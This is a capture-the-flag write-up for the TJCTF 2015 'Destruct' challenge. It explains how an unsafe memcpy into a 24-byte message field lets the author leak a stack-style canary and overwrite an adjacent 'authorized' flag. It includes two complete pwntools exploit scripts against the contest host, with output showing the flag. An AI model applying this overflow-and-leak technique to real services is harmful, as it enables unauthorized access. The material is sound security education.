---
layout: post
title: "TJCTF 2015 Destruct"
date: 2015-04-29 01:46:38 -0400
author: [superkojiman]
comments: true
categories: [TJCTF]
---

### Solved by superkojiman

Connecting to the target returns a menu: 

```
koji@pwnbox32:~/Desktop/destruct$ nc p.tjctf.org 8085
Commands:

u: Set username.
p: Set password.
m: Set message.
d: Display info.
c: Check authorization.
f: If authorized, print flag.
>
```

Option "f" appears to be what we want. Selecting it returns an error saying that we're not authorized, obviously. If we look at destruct.c, we see that there's a struct P containing the following:

```c
typedef struct P {
    char user[32];
    char pass[32];
    char mess[24];
    int canary;
    int authorized;
} Person;
```

If we look at what happens when we select "f", we see:

```c
case 'f':
    if (p->authorized) {
        printf("Authorized!\nFlag: ");
        FILE *f = fopen("flag","r");
        while ((c2 = fgetc(f)) != EOF) {
            printf("%c",c2);
        }
        fclose(f);
    } else {
        printf("Not Authorized.\n");
    }
    break
```

So the problem is that p->authorized is set to 0 (false), and we need it to be set to greater than 0 (true). Further examination of the code reveals that there's an overflow when entering a message (choosing option "m"). In struct P, the buffer for storing the message is 24 bytes. However, the code responsible for copying the message into that buffer is copying up to 32 bytes: 

```c
char buf[32] = {0};
while (1) {
.
.
.
    case 'm':
        printf("Enter new message.\n");
        read_in(buf);
        memcpy(p->mess,buf,strlen(buf));        // whoops! strlen(buf) returns 32
        break;
```

If we write more than 24 bytes to p->mess, then we can overwrite p->authorized. However, p->canary sits between p->mess and p->authorized, so overwriting p->authorized means we'll also overwrite p->canary. p->canary is a randomly generated 4-byte value and a check is made to see if it's been changed, and if it has, the program quits:

```c
if (canary != p->canary) {
    printf("Error: Canary has been changed.\n");
    return 1;
}
```

The canary is generated once when the program starts and stays the same until the program is restarted. As it turns out, we can leak the canary's value by writing exactly 24 bytes to mess and then selecting the "d" option to display our info. When we display our info, the message will include the canary since p->mess isnt null terminated. Here's the code to leak the canary:  

```python
#!/usr/bin/env python

from pwn import *

r = remote("p.tjctf.org", 8085)
r.recv()

# set message
r.send("m" + "\n")
r.recv()
r.send("A"*24 + "\n")
r.recv()
r.recv()

# display info and leak the canary
r.send("d" + "\n")
msg = r.recv().strip()
r.recv()
canary = msg[len(msg)-4:]
print "canary :", enhex(canary)
```

Let's see it in action: 

```text
koji@pwnbox32:~/Desktop/destruct$ ./leak.py 
[+] Opening connection to p.tjctf.org on port 8085: Done
canary : 414c69e4
[*] Closed connection to p.tjctf.org port 8085
```

Now that we can leak the canary, we can simply enter another message of 24 bytes, followed by our leaked canary, and any value that sets p->authorized to greater than 0. 


```python
#!/usr/bin/env python

from pwn import *

r = remote("p.tjctf.org", 8085)
print r.recv()

# set message
r.send("m" + "\n")
print r.recv()
r.send("A"*24 + "\n")
print r.recv()
print r.recv()

# display info and leak the canary
r.send("d" + "\n")
msg = r.recv().strip()
print r.recv()
canary = msg[len(msg)-4:]
print "canary :", enhex(canary)

# now overwrite authorized member
buf = ""
buf += "A"*24       # message
buf += canary       # leaked canary
buf += p32(0x1)     # set authorized to 1
r.send("m" + "\n")
print r.recv()
r.send(buf + "\n")
print r.recv()
print r.recv()

# get the flag
r.send("f" + "\n")
print r.recv()
print r.recv()
```

Let's do it:

```text
koji@pwnbox32:~/Desktop/destruct$ ./sploit.py 
[+] Opening connection to p.tjctf.org on port 8085: Done
Commands:

u: Set username.
p: Set password.
m: Set message.
d: Display info.
c: Check authorization.
f: If authorized, print flag.

>
Enter new message.

>
>
canary : de073b7c
Enter new message.


>
Authorized!
Flag: 
5truc7byL1ghtn1ng
>
[*] Closed connection to p.tjctf.org port 8085
```

The flag is: 5truc7byL1ghtn1ng
